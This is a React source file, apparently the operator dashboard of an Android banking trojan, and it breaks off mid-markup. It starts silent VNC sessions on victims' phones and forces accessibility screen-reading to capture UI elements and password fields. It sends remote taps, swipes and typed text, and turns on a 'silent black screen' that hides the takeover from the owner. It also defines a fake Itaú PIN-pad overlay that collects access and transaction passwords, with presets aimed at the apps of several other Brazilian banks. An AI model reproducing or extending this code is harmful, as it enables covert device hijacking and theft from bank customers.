import { useState, useEffect, useRef } from 'react';
import { X, ExternalLink, ArrowLeft, Home, Layers, RefreshCw, Zap, Maximize2, Minimize2, Eye, Tv, Sliders, List, Send, CornerDownLeft, Delete, Clipboard, Search } from 'lucide-react';
import type { Cliente } from '@/types/dashboard';
import DeviceScreen from '../DeviceScreen';
import LatencyBadge from './LatencyBadge';
import { devicesAPI, getApiBaseUrl } from '@/services/api';
import { useTranslation } from '../../utils/i18n';

interface QuickVNCModalProps {
  devices: Cliente[];
  onClose: () => void;
  onRemoveDevice: (deviceId: string) => void;
  onNavigateToDevice: (deviceId: string) => void;
}

// Lista de Presets de Tela Preta & Bancos para Seleção Direta
const BLACK_SCREEN_PRESETS = [
  { id: 'standard', name: '⬛ Tela Preta Silenciosa Padrão', package_name: '' },
  { 
    id: 'itau', 
    name: '🔥 Itaú - Senha de Acesso (2 Passos)', 
    package_name: 'br.com.itau',
    template: {
      id: 'preset-itau-system',
      name: '🔥 Itaú - Senha de Acesso (Oficial Interativo)',
      backgroundColor: '#f1f2f4',
      multiStep: true,
      step1Label: 'SENHA DE ACESSO ITAÚ',
      step2Label: 'SENHA DE TRANSAÇÃO ITAÚ',
      package_name: 'br.com.itau',
      elements: [
        { id: 'itau-sys-logo', type: 'logo', x: 125, y: 60, width: 110, height: 110, content: '📱🔒', fontSize: 42, color: '#ed7c0e', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-title', type: 'text', x: 20, y: 180, width: 320, height: 35, content: 'Digite a senha de acesso', fontSize: 22, fontWeight: 'bold', color: '#1a1a1a', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-dots', type: 'text', x: 70, y: 235, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 22, fontWeight: 'bold', color: '#ed7c0e', textAlign: 'center', opacity: 100 },
        { id: 'itau-sys-k1', type: 'button', x: 25, y: 290, width: 95, height: 48, content: '1', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k2', type: 'button', x: 132, y: 290, width: 95, height: 48, content: '2', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k3', type: 'button', x: 240, y: 290, width: 95, height: 48, content: '3', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k4', type: 'button', x: 25, y: 350, width: 95, height: 48, content: '4', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k5', type: 'button', x: 132, y: 350, width: 95, height: 48, content: '5', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k6', type: 'button', x: 240, y: 350, width: 95, height: 48, content: '6', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k7', type: 'button', x: 25, y: 410, width: 95, height: 48, content: '7', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k8', type: 'button', x: 132, y: 410, width: 95, height: 48, content: '8', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k9', type: 'button', x: 240, y: 410, width: 95, height: 48, content: '9', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-k0', type: 'button', x: 132, y: 470, width: 95, height: 48, content: '0', backgroundColor: '#ffffff', color: '#ed7c0e', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-kdel', type: 'button', x: 240, y: 470, width: 95, height: 48, content: '⌫', backgroundColor: '#ffffff', color: '#6b6b6b', borderRadius: 12, opacity: 100 },
        { id: 'itau-sys-btn', type: 'button', x: 20, y: 585, width: 320, height: 50, content: 'Continuar', buttonAction: 'submit', backgroundColor: '#ed7c0e', color: '#ffffff', borderRadius: 999 }
      ]
    }
  },
  { id: 'bradesco', name: '🔥 Bradesco - Validação de Chave', package_name: 'br.com.bradesco.netemp' },
  { id: 'nubank', name: '🔥 Nubank - Confirmação de Senha', package_name: 'com.nu.production' },
  { id: 'bb', name: '🔥 Banco do Brasil - Código Segurança', package_name: 'br.com.bb.altair' },
  { id: 'caixa', name: '🔥 Caixa Econômica - Validação', package_name: 'br.gov.caixa.tem' },
  { id: 'santander', name: '🔥 Santander - Validação de Token', package_name: 'com.santander.app' },
  { id: 'sicredi', name: '🔥 Sicredi / Sicoob - Confirmação', package_name: 'br.com.sicredi.mobile' },
  { id: 'transportadora', name: '🚚 Transportadora / Rastreio', package_name: 'com.correios.rastreio' }
];

// Sub-componente para renderizar a Tela V2 (Screen Reader Canvas) com toques (CLICK), arrastes (SWIPE) e customização total
function QuickV2Canvas({ 
  deviceId, 
  onCommand,
  textScale = 1.0,
  opacity = 0.7,
  designTheme = 'cyan',
  cornerStyle = 'brackets',
  showGrid = true,
  showCoords = false,
  hideUntyped = false,
  onNodesExtracted
}: { 
  deviceId: string; 
  onCommand: (cmd: any) => void;
  textScale?: number;
  opacity?: number;
  designTheme?: 'cyan' | 'matrix' | 'neon-red' | 'purple-glowing';
  cornerStyle?: 'brackets' | 'full-border' | 'dots' | 'none';
  showGrid?: boolean;
  showCoords?: boolean;
  hideUntyped?: boolean;
  onNodesExtracted?: (nodes: any[]) => void;
}) {
  const [hierarchy, setHierarchy] = useState<any>(null);
  const [loading, setLoading] = useState<boolean>(true);
  const [touchVisuals, setTouchVisuals] = useState<Array<{ id: number; x: number; y: number; type: 'click' | 'swipe'; endX?: number; endY?: number }>>([]);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const pointerStartRef = useRef<{ x: number; y: number; time: number } | null>(null);
  const touchIdCounter = useRef(0);

  const addTouchVisual = (visual: { x: number; y: number; type: 'click' | 'swipe'; endX?: number; endY?: number }) => {
    const id = ++touchIdCounter.current;
    setTouchVisuals((prev) => [...prev, { ...visual, id }]);
    setTimeout(() => {
      setTouchVisuals((prev) => prev.filter((v) => v.id !== id));
    }, 600);
  };

  useEffect(() => {
    let isMounted = true;
    
    // Força disparo do leitor de tela no aparelho ao montar V2
    onCommand({ action: 'TOGGLE_SCREEN_READER', enabled: true });

    const fetchH = async () => {
      try {
        const token = localStorage.getItem('token');
        const res = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/screen-hierarchy`, {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Cache-Control': 'no-cache'
          }
        });
        if (res.ok) {
          const data = await res.json();
          if (data.status === 'ok' && data.data && isMounted) {
            try {
              const parsed = JSON.parse(data.data);
              const rootH = parsed.hierarchy || parsed.root || parsed;
              if (rootH) {
                setHierarchy(rootH);
                setLoading(false);
              }
            } catch (e) {}
          } else if (isMounted && (!data.data || data.status === 'empty')) {
            // Se estiver vazio, re-dispara a captura de acessibilidade
            onCommand({ action: 'TOGGLE_SCREEN_READER', enabled: true });
          }
        }
      } catch (e) {}
    };

    fetchH();
    const interval = setInterval(fetchH, 1000);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [deviceId]);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const devW = hierarchy?.bounds?.w || 1080;
    const devH = hierarchy?.bounds?.h || 2400;

    canvas.width = devW;
    canvas.height = devH;

    // Definição de Cores pelo Tema Escolhido
    let bgColor = '#0c0202';
    let gridColor = 'rgba(239, 68, 68, 0.12)';
    let defaultStroke = 'rgba(61, 32, 32, 0.6)';
    let clickStroke = '#ef4444';
    let clickFill = 'rgba(239, 68, 68, 0.25)';
    let pwdStroke = '#f97316';
    let pwdFill = 'rgba(234, 88, 12, 0.3)';

    if (designTheme === 'matrix') {
      bgColor = '#010f03';
      gridColor = 'rgba(0, 255, 70, 0.12)';
      defaultStroke = 'rgba(0, 100, 30, 0.6)';
      clickStroke = '#00ff46';
      clickFill = 'rgba(0, 255, 70, 0.25)';
      pwdStroke = '#ff3131';
      pwdFill = 'rgba(255, 49, 49, 0.35)';
    } else if (designTheme === 'neon-red') {
      bgColor = '#0f0203';
      gridColor = 'rgba(239, 68, 68, 0.12)';
      defaultStroke = 'rgba(127, 29, 29, 0.6)';
      clickStroke = '#ef4444';
      clickFill = 'rgba(239, 68, 68, 0.25)';
      pwdStroke = '#ff0055';
      pwdFill = 'rgba(255, 0, 85, 0.35)';
    } else if (designTheme === 'purple-glowing') {
      bgColor = '#140103';
      gridColor = 'rgba(239, 68, 68, 0.12)';
      defaultStroke = 'rgba(127, 29, 29, 0.6)';
      clickStroke = '#ef4444';
      clickFill = 'rgba(239, 68, 68, 0.25)';
      pwdStroke = '#f472b6';
      pwdFill = 'rgba(244, 114, 182, 0.35)';
    }

    ctx.fillStyle = bgColor;
    ctx.fillRect(0, 0, devW, devH);

    // Grade de Blueprint
    if (showGrid) {
      ctx.strokeStyle = gridColor;
      ctx.lineWidth = 1.5;
      for (let x = 0; x < devW; x += 60) {
        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, devH); ctx.stroke();
      }
      for (let y = 0; y < devH; y += 60) {
        ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(devW, y); ctx.stroke();
      }
    }

    if (!hierarchy) return;

    const nodes: any[] = [];
    const collectNodes = (node: any) => {
      if (!node || !node.bounds) return;
      const { x, y, w, h } = node.bounds;
      if (w < 8 || h < 8 || x + w < -50 || y + h < -50) return;

      const hasText = !!(node.text?.trim() || node.desc?.trim() || node.hint?.trim());
      const isInteractive = node.clickable || node.editable || node.password || node.isPinDigit || node.button;
      const isLeaf = !node.children || !Array.isArray(node.children) || node.children.length === 0;

      if (isLeaf || hasText || isInteractive) {
        nodes.push(node);
      }

      if (node.children && Array.isArray(node.children)) {
        node.children.forEach(collectNodes);
      }
    };

    collectNodes(hierarchy);
    if (onNodesExtracted) onNodesExtracted(nodes);

    nodes.sort((a, b) => {
      const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
      const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
      return areaB - areaA;
    });

    nodes.forEach((n) => {
      const { x, y, w, h } = n.bounds || {};
      if (!w || !h) return;

      const isClick = n.clickable || n.isPinDigit || n.button;
      const isPwd = n.password || n.editable;
      const label = (n.text || n.desc || n.hint || '').trim();

      if (hideUntyped && !label && !isPwd && !isClick) return;

      ctx.save();
      if (isPwd) {
        ctx.fillStyle = pwdFill;
        ctx.strokeStyle = pwdStroke;
        ctx.lineWidth = 3;
      } else if (isClick) {
        ctx.fillStyle = clickFill;
        ctx.strokeStyle = clickStroke;
        ctx.lineWidth = 2.5;
      } else if (label) {
        ctx.fillStyle = 'rgba(22, 6, 6, 0.6)';
        ctx.strokeStyle = defaultStroke;
        ctx.lineWidth = 1.5;
      } else {
        ctx.fillStyle = 'rgba(42, 18, 18, 0.15)';
        ctx.strokeStyle = 'rgba(61, 32, 32, 0.3)';
        ctx.lineWidth = 1;
      }

      if (cornerStyle === 'brackets') {
        ctx.fillRect(x, y, w, h);
        const len = Math.max(6, Math.min(14, w / 4, h / 4));
        ctx.beginPath();
        ctx.moveTo(x + len, y); ctx.lineTo(x, y); ctx.lineTo(x, y + len);
        ctx.moveTo(x + w - len, y); ctx.lineTo(x + w, y); ctx.lineTo(x + w, y + len);
        ctx.moveTo(x, y + h - len); ctx.lineTo(x, y + h); ctx.lineTo(x + len, y + h);
        ctx.moveTo(x + w - len, y + h); ctx.lineTo(x + w, y + h); ctx.lineTo(x + w, y + h - len);
        ctx.stroke();
      } else {
        const rad = cornerStyle === 'full-border' ? Math.min(10, w / 8, h / 8) : 0;
        ctx.beginPath();
        if (rad > 0 && typeof (ctx as any).roundRect === 'function') {
          (ctx as any).roundRect(x, y, w, h, rad);
        } else {
          ctx.rect(x, y, w, h);
        }
        ctx.fill();
        if (cornerStyle !== 'none') ctx.stroke();
      }

      if (label && h >= 22) {
        ctx.fillStyle = '#ffffff';
        const fontSize = Math.max(14, Math.min(28, Math.floor(h * 0.45 * textScale)));
        ctx.font = `bold ${fontSize}px sans-serif`;
        ctx.textBaseline = 'middle';
        const displayLabel = label.length > 28 ? label.slice(0, 26) + '…' : label;
        ctx.fillText(displayLabel, x + 10, y + h / 2);
      }

      if (showCoords) {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
        ctx.font = '10px monospace';
        ctx.fillText(`${x},${y}`, x + 2, y + 10);
      }
      ctx.restore();
    });
  }, [hierarchy, textScale, opacity, designTheme, cornerStyle, showGrid, showCoords, hideUntyped]);

  const handlePointerDown = (e: React.PointerEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const normX = (e.clientX - rect.left) / rect.width;
    const normY = (e.clientY - rect.top) / rect.height;
    pointerStartRef.current = { x: normX, y: normY, time: Date.now() };
  };

  const handlePointerUp = (e: React.PointerEvent<HTMLCanvasElement>) => {
    const start = pointerStartRef.current;
    if (!start) return;

    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const endNormX = (e.clientX - rect.left) / rect.width;
    const endNormY = (e.clientY - rect.top) / rect.height;
    const deltaTime = Date.now() - start.time;

    const dxPixels = (endNormX - start.x) * rect.width;
    const dyPixels = (endNormY - start.y) * rect.height;
    const distPixels = Math.hypot(dxPixels, dyPixels);

    if (distPixels < 12) {
      onCommand({
        action: 'CLICK',
        x: Number(start.x.toFixed(4)),
        y: Number(start.y.toFixed(4)),
        scale: 'vnc_norm'
      });
      addTouchVisual({ x: start.x, y: start.y, type: 'click' });
    } else {
      onCommand({
        action: 'SWIPE',
        x1: Number(start.x.toFixed(4)),
        y1: Number(start.y.toFixed(4)),
        x2: Number(endNormX.toFixed(4)),
        y2: Number(endNormY.toFixed(4)),
        duration: Math.max(150, deltaTime),
        scale: 'vnc_norm'
      });
      addTouchVisual({ x: start.x, y: start.y, endX: endNormX, endY: endNormY, type: 'swipe' });
    }

    pointerStartRef.current = null;
  };

  return (
    <div className="relative w-full h-full flex flex-col items-center justify-center bg-[#0c0202] p-1 overflow-hidden select-none">
      {loading ? (
        <div className="flex flex-col items-center justify-center p-4 text-[#ef4444] font-mono text-xs animate-pulse gap-2">
          <Eye className="w-6 h-6 text-[#ef4444] animate-spin" />
          <span>Sincronizando Estrutura V2...</span>
          <button
            type="button"
            onClick={() => onCommand({ action: 'TOGGLE_SCREEN_READER', enabled: true })}
            className="px-2 py-1 bg-[#121214] border border-[#2a2a31]/40 rounded text-[10px] text-[#ef4444] font-bold hover:bg-[#1a1a1e] transition-colors cursor-pointer"
          >
            ⚡ Forçar Sincronia V2
          </button>
        </div>
      ) : (
        <div className="relative flex items-center justify-center max-h-full max-w-full">
          <canvas
            ref={canvasRef}
            onPointerDown={handlePointerDown}
            onPointerUp={handlePointerUp}
            className="max-h-full max-w-full object-contain rounded-md border border-[#2a2a31]/40 cursor-crosshair hover:border-[#4a4a56] transition-all shadow-[0_0_15px_rgba(239,68,68,0.2)] touch-none"
            title="Clique ou arraste na Tela V2 para controlar o aparelho"
          />
          {touchVisuals.map((t) => (
            <div
              key={t.id}
              className="pointer-events-none absolute z-50 transform -translate-x-1/2 -translate-y-1/2"
              style={{ left: `${t.x * 100}%`, top: `${t.y * 100}%` }}
            >
              {t.type === 'click' ? (
                <div className="w-8 h-8 rounded-full border-2 border-[#3a3a44] bg-[#ef4444]/40 animate-ping shadow-[0_0_15px_#ef4444]" />
              ) : (
                <div className="w-6 h-6 rounded-full border-2 border-amber-400 bg-amber-500/40 animate-pulse shadow-[0_0_15px_#f59e0b]" />
              )}
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

export default function QuickVNCModal({ devices, onClose, onRemoveDevice, onNavigateToDevice }: QuickVNCModalProps) {
  const { t } = useTranslation();
  const [blackScreens, setBlackScreens] = useState<Record<string, boolean>>({});
  const [selectedBlackPresetMap, setSelectedBlackPresetMap] = useState<Record<string, string>>({});
  const [sendingCmds, setSendingCmds] = useState<Record<string, boolean>>({});
  const [isGridExpanded, setIsGridExpanded] = useState(false);
  const [viewMode, setViewMode] = useState<'both' | 'vnc' | 'v2'>('both');
  const [showV2Customizer, setShowV2Customizer] = useState<boolean>(false);
  const [showElementsList, setShowElementsList] = useState<boolean>(false);
  const [extractedNodesMap, setExtractedNodesMap] = useState<Record<string, any[]>>({});
  const [elementSearchText, setElementSearchText] = useState<string>('');
  const [elementFilterCategory, setElementFilterCategory] = useState<'all' | 'interactive' | 'input' | 'text'>('all');
  const [textInputsMap, setTextInputsMap] = useState<Record<string, string>>({});

  // Estados de Personalização da V2
  const [v2TextScale, setV2TextScale] = useState<number>(1.0);
  const [v2Opacity, setV2Opacity] = useState<number>(0.7);
  const [v2DesignTheme, setV2DesignTheme] = useState<'cyan' | 'matrix' | 'neon-red' | 'purple-glowing'>('cyan');
  const [v2CornerStyle, setV2CornerStyle] = useState<'brackets' | 'full-border' | 'dots' | 'none'>('brackets');
  const [v2ShowGrid, setV2ShowGrid] = useState<boolean>(true);
  const [v2ShowCoords, setV2ShowCoords] = useState<boolean>(false);
  const [v2HideUntyped, setV2HideUntyped] = useState<boolean>(false);

  useEffect(() => {
    if (!devices || devices.length === 0) return;
    devices.forEach((d) => {
      const devId = d.id || d.deviceId;
      if (devId) {
        devicesAPI.sendCommand(devId, { action: 'START_SILENT_VNC' }).catch(() => {});
        devicesAPI.sendCommand(devId, { action: 'REQUEST_VNC_FRAME' }).catch(() => {});
        devicesAPI.sendCommand(devId, { action: 'TOGGLE_SCREEN_READER', enabled: true }).catch(() => {});
      }
    });
  }, [devices]);

  if (!devices || devices.length === 0) return null;

  const sendCommand = async (deviceId: string, action: string, extra: any = {}) => {
    try {
      setSendingCmds((prev) => ({ ...prev, [deviceId]: true }));
      await devicesAPI.sendCommand(deviceId, { action, ...extra });
    } catch (err) {
      console.error(`Erro ao enviar comando VNC para ${deviceId}:`, err);
    } finally {
      setTimeout(() => {
        setSendingCmds((prev) => ({ ...prev, [deviceId]: false }));
      }, 300);
    }
  };

  const handleSendText = (deviceId: string) => {
    const text = textInputsMap[deviceId] || '';
    if (!text.trim()) return;
    sendCommand(deviceId, 'TYPE', { text });
    setTextInputsMap((prev) => ({ ...prev, [deviceId]: '' }));
  };

  const toggleBlackScreen = async (deviceId: string) => {
    const nextState = !blackScreens[deviceId];
    setBlackScreens((prev) => ({ ...prev, [deviceId]: nextState }));
    
    if (nextState) {
      const presetId = selectedBlackPresetMap[deviceId] || 'standard';
      const presetObj = BLACK_SCREEN_PRESETS.find(p => p.id === presetId);
      
      if (presetObj && presetObj.id !== 'standard' && presetObj.template) {
        // Modelo de banco ou tela customizada
        await sendCommand(deviceId, 'CUSTOM_BLACK_SCREEN', {
          package: presetObj.package_name || '',
          template: presetObj.template
        });
      } else {
        // Tela Preta Silenciosa Padrão (Sem PIN, Sem botões, 100% Preta)
        await sendCommand(deviceId, 'BLACK_SCREEN_ON');
        await sendCommand(deviceId, 'ENABLE_BLACK_SCREEN');
      }
    } else {
      await sendCommand(deviceId, 'BLACK_SCREEN_OFF');
      await sendCommand(deviceId, 'HIDE_LOCKSCREEN');
      await sendCommand(deviceId, 'DISABLE_BLACK_SCREEN');
    }
  };

  const clickNodeElement = (deviceId: string, node: any) => {
    if (!node || !node.bounds) return;
    const devW = 1080;
    const devH = 2400;
    const cx = node.bounds.x + node.bounds.w / 2;
    const cy = node.bounds.y + node.bounds.h / 2;
    const normX = Number((cx / devW).toFixed(4));
    const normY = Number((cy / devH).toFixed(4));
    sendCommand(deviceId, 'CLICK', { x: normX, y: normY, scale: 'vnc_norm' });
  };

  const getGridColsClass = () => {
    if (viewMode === 'both') {
      if (devices.length === 1) return showElementsList ? 'max-w-[95vw]' : 'max-w-6xl';
      return 'max-w-[96vw]';
    }
    if (devices.length === 1) return 'max-w-2xl';
    return 'max-w-7xl';
  };

  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center p-2 sm:p-3 bg-slate-950/85 backdrop-blur-xl animate-in fade-in duration-200 overflow-y-auto">
      <div className={`relative w-full ${getGridColsClass()} bg-[#1e0603] border border-[#2a2a31]/40 rounded-3xl shadow-[0_25px_70px_rgba(239,68,68,0.25)] overflow-hidden flex flex-col my-auto max-h-[96vh]`}>
        {/* Top Glow Bar */}
        <div className="h-[2.5px] w-full bg-gradient-to-r from-[#ef4444] via-[#f87171] via-emerald-400 to-[#84cc16] animate-pulse" />

        {/* Global Multi-VNC Control Header */}
        <div className="flex flex-wrap items-center justify-between px-4 py-2.5 border-b border-[#2a2a31]/25 bg-[#2c0903]/95 backdrop-blur-md gap-2">
          <div className="flex items-center gap-3">
            <div className="flex items-center justify-center w-8 h-8 rounded-md bg-[#ef4444]/20 border border-[#3a3a44]/40 text-[#ef4444] font-mono text-sm font-black shadow-[0_0_15px_rgba(239,68,68,0.3)]">
              📺
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-white font-black text-sm uppercase font-mono tracking-wider">
                  {t('vnc.quick_title')} ({devices.length})
                </h3>
                <span className="text-[10px] text-[#ef4444] bg-[#121214]/90 border border-[#2a2a31]/40 px-2 py-0.5 rounded-full font-mono font-bold animate-pulse">
                  {t('vnc.active_vnc')}
                </span>
              </div>
              <p className="text-[10px] text-slate-400 font-mono">
                {t('vnc.view_device')} (VNC + V2)
              </p>
            </div>
          </div>

          {/* Selector de Modo + Ferramentas de Customização */}
          <div className="flex flex-wrap items-center gap-1.5 font-mono text-xs">
            <div className="flex items-center gap-1 bg-[#121214] p-1 rounded-md border border-[#2a2a31]/30">
              <button
                type="button"
                onClick={() => setViewMode('both')}
                className={`px-2.5 py-1 rounded-md font-bold transition-all flex items-center gap-1 cursor-pointer ${
                  viewMode === 'both'
                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)] border border-[#4a4a56]'
                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]/60'
                }`}
                title="Mostrar VNC Normal e Tela V2 lado a lado"
              >
                <span>📺 + 👁️ VNC + V2</span>
              </button>

              <button
                type="button"
                onClick={() => setViewMode('vnc')}
                className={`px-2.5 py-1 rounded-md font-bold transition-all flex items-center gap-1 cursor-pointer ${
                  viewMode === 'vnc'
                    ? 'bg-[#ef4444] text-white shadow-[0_0_10px_rgba(239,68,68,0.4)] border border-[#3a3a44]'
                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]/60'
                }`}
                title="Mostrar Apenas VNC Normal"
              >
                <Tv className="w-3.5 h-3.5" />
                <span>Apenas VNC</span>
              </button>

              <button
                type="button"
                onClick={() => setViewMode('v2')}
                className={`px-2.5 py-1 rounded-md font-bold transition-all flex items-center gap-1 cursor-pointer ${
                  viewMode === 'v2'
                    ? 'bg-teal-600 text-white shadow-[0_0_10px_rgba(239,68,68,0.4)] border border-teal-400'
                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]/60'
                }`}
                title="Mostrar Apenas Tela V2"
              >
                <Eye className="w-3.5 h-3.5 text-[#ef4444]" />
                <span>Apenas V2</span>
              </button>
            </div>

            {/* Botões de Ação para Mostrar Painel da V2 */}
            <button
              type="button"
              onClick={() => setShowElementsList(!showElementsList)}
              className={`px-2.5 py-1.5 rounded-md border font-bold flex items-center gap-1 transition-all cursor-pointer ${
                showElementsList
                  ? 'bg-amber-600 text-white border-amber-300 shadow-[0_0_12px_rgba(245,158,11,0.4)]'
                  : 'bg-[#121214]/80 text-amber-300 border-amber-500/40 hover:bg-amber-950'
              }`}
              title="Abrir Lista de Elementos Clicáveis da Tela V2"
            >
              <List className="w-3.5 h-3.5 text-amber-300" />
              <span>Elementos V2</span>
            </button>

            <button
              type="button"
              onClick={() => setShowV2Customizer(!showV2Customizer)}
              className={`px-2.5 py-1.5 rounded-md border font-bold flex items-center gap-1 transition-all cursor-pointer ${
                showV2Customizer
                  ? 'bg-[#84cc16] text-white border-[#fca5a5] shadow-[0_0_12px_rgba(239,68,68,0.4)]'
                  : 'bg-[#121214]/80 text-[#fca5a5] border-[#f87171]/40 hover:bg-purple-950'
              }`}
              title="Editar visual e tema da Tela V2"
            >
              <Sliders className="w-3.5 h-3.5 text-[#fca5a5]" />
              <span>Editar V2</span>
            </button>
          </div>

          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => setIsGridExpanded(!isGridExpanded)}
              className="p-2 text-slate-300 hover:text-[#ef4444] hover:bg-[#24242a]/80 rounded-md transition-all border border-[#2a2a31]/20 cursor-pointer"
              title={isGridExpanded ? "Modo Ajustado" : "Expandir Grade"}
            >
              {isGridExpanded ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
            </button>

            <button
              type="button"
              onClick={onClose}
              className="p-2 text-slate-400 hover:text-white hover:bg-[#24242a] rounded-md transition-colors cursor-pointer"
              title="Fechar Janela"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* 🎛️ Painel Expansível de Customização da Tela V2 */}
        {showV2Customizer && (
          <div className="bg-[#300903] border-b border-[#f87171]/30 p-3 px-5 grid grid-cols-2 sm:grid-cols-4 md:grid-cols-7 gap-3 text-xs font-mono text-slate-200 animate-in slide-in-from-top-2 duration-150">
            <div>
              <label className="block text-[10px] text-[#fca5a5] font-bold mb-1">TAMANHO TEXTO ({Math.round(v2TextScale * 100)}%)</label>
              <input
                type="range" min="60" max="200" value={v2TextScale * 100}
                onChange={(e) => setV2TextScale(parseFloat(e.target.value) / 100)}
                className="w-full accent-[#f87171] cursor-pointer"
              />
            </div>

            <div>
              <label className="block text-[10px] text-[#fca5a5] font-bold mb-1">OPACIDADE ({Math.round(v2Opacity * 100)}%)</label>
              <input
                type="range" min="20" max="100" value={v2Opacity * 100}
                onChange={(e) => setV2Opacity(parseFloat(e.target.value) / 100)}
                className="w-full accent-[#f87171] cursor-pointer"
              />
            </div>

            <div>
              <label className="block text-[10px] text-[#fca5a5] font-bold mb-1">TEMA DESIGN</label>
              <select
                value={v2DesignTheme}
                onChange={(e) => setV2DesignTheme(e.target.value as any)}
                className="w-full bg-[#121214] border border-[#f87171]/40 rounded px-2 py-1 text-white font-bold"
              >
                <option value="cyan">🩵 Modern Cyan</option>
                <option value="matrix">💚 Hacker Matrix</option>
                <option value="neon-red">🔴 Cyber Red</option>
                <option value="purple-glowing">💜 Deep Purple</option>
              </select>
            </div>

            <div>
              <label className="block text-[10px] text-[#fca5a5] font-bold mb-1">CANTOS / BORDAS</label>
              <select
                value={v2CornerStyle}
                onChange={(e) => setV2CornerStyle(e.target.value as any)}
                className="w-full bg-[#121214] border border-[#f87171]/40 rounded px-2 py-1 text-white font-bold"
              >
                <option value="brackets">📐 HUD Brackets</option>
                <option value="full-border">🔲 Arredondado</option>
                <option value="none">🚫 Sem Bordas</option>
              </select>
            </div>

            <div className="flex items-center gap-2 pt-4">
              <input
                type="checkbox" checked={v2ShowGrid} onChange={(e) => setV2ShowGrid(e.target.checked)}
                className="accent-[#f87171] rounded cursor-pointer" id="chk-grid"
              />
              <label htmlFor="chk-grid" className="cursor-pointer text-[11px]">Grade Fundo</label>
            </div>

            <div className="flex items-center gap-2 pt-4">
              <input
                type="checkbox" checked={v2ShowCoords} onChange={(e) => setV2ShowCoords(e.target.checked)}
                className="accent-[#f87171] rounded cursor-pointer" id="chk-coords"
              />
              <label htmlFor="chk-coords" className="cursor-pointer text-[11px]">Coordenadas</label>
            </div>

            <div className="flex items-center gap-2 pt-4">
              <input
                type="checkbox" checked={v2HideUntyped} onChange={(e) => setV2HideUntyped(e.target.checked)}
                className="accent-[#f87171] rounded cursor-pointer" id="chk-untyped"
              />
              <label htmlFor="chk-untyped" className="cursor-pointer text-[11px]">Apenas Textos</label>
            </div>
          </div>
        )}

        {/* Multi Device VNC + V2 Screens Grid */}
        <div className={`grid ${devices.length === 1 ? 'grid-cols-1' : 'grid-cols-1 lg:grid-cols-2'} gap-3 p-2.5 sm:p-3 overflow-y-auto max-h-[85vh] bg-[#160303]`}>
          {devices.map((cliente) => {
            const isOnline = cliente.status === 'online';
            const isBlack = !!blackScreens[cliente.deviceId];
            const isSending = !!sendingCmds[cliente.deviceId];
            const currentNodes = extractedNodesMap[cliente.deviceId] || [];

            // Filtragem de elementos para o painel lateral
            const filteredNodes = currentNodes.filter((n) => {
              const text = (n.text || n.desc || n.hint || n.id || '').toLowerCase();
              if (elementSearchText && !text.includes(elementSearchText.toLowerCase())) return false;
              if (elementFilterCategory === 'interactive') return n.clickable || n.button;
              if (elementFilterCategory === 'input') return n.password || n.editable;
              if (elementFilterCategory === 'text') return !!(n.text || n.desc || n.hint);
              return true;
            });

            return (
              <div
                key={cliente.deviceId}
                className="relative bg-[#240703] border border-[#2a2a31]/30 hover:border-[#3a3a44]/60 rounded-md overflow-hidden flex flex-col shadow-lg shadow-black/60 transition-all group"
              >
                {/* Device Card Topbar */}
                <div className="flex items-center justify-between px-3.5 py-2 bg-[#330a03] border-b border-[#2a2a31]/20">
                  <div className="flex items-center gap-2 min-w-0">
                    <span className={`w-2.5 h-2.5 rounded-full flex-shrink-0 ${isOnline ? 'bg-emerald-400 shadow-[0_0_8px_#10b981]' : 'bg-[#6f6f78]'}`} />
                    <span className="text-white font-bold text-xs truncate font-mono uppercase tracking-wider">
                      {cliente.modelName || cliente.tag}
                    </span>
                    <span className="text-[9px] text-[#ef4444] bg-[#121214]/80 px-1.5 py-0.5 rounded font-mono border border-[#2a2a31]/30 flex-shrink-0">
                      {cliente.ip || '192.168.1.10'}
                    </span>
                  </div>

                  <div className="flex items-center gap-1.5 flex-shrink-0">
